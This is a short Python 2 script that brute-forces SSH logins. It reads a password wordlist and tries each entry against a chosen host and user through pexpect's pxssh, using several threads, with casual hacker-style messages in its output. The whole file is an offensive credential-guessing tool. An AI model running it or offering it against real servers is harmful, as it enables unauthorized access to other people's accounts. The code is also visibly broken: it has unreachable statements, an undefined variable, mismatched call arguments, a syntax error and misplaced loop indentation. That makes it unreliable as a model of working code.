#pxssh is a script included in the pexpect library.
#has better methods that make our script shorter
import pxssh
import optparse
import time
from threading import *
#so we don't overwhelm the system
maxConnections = 5
connection_lock = BoundedSemaphore(value = maxConnections)
Found = False
Fails = 0

#we don't need a separate send_command function anymore
def connect(host, user, password):
    global Found
    global Fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        return s
    Found = True

    except Exception, e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
        finally:
            if realse:
                connection_lock.release()


def main():
    parser = optparse.OptionParser('usage%prog -H <target host> -u <user> -F <password list>')
    parser.add_option('-H', dest = 'tgtHost', type = 'string', help = 'specify target host')
    parser.add_option('-F', dest = 'passwdFile', type = 'string', help = 'specify password file')
    parser.add_option('-u', dest = 'user', type = 'string', help = 'specify the user')

    (options, args) = parser.parse_args()

    host = options.tgtHost
    passwdFile = options.passwdFile
    user = options.user

    if host == None or passwdFile == None or user == None:
        print parser.usage
        exit(0)

    fn = open(passwdFile, 'r')
    for line in fn.readlines():
        if Found:
            print "[*] Exiting: Password found bois"
            exit(0)
            if Fails > 5:
                print "[!] Exiting: too many sockets br0h"
                exit(0)
            connection_lock.acquire()
            password = line.strip('\r').strip('\n')
            print "[-] Testing: " + str(password)
            t = Thread(target = connect, args(host, user, password, True))

        child = t.start()

if __name__ == '__main__':
    main()
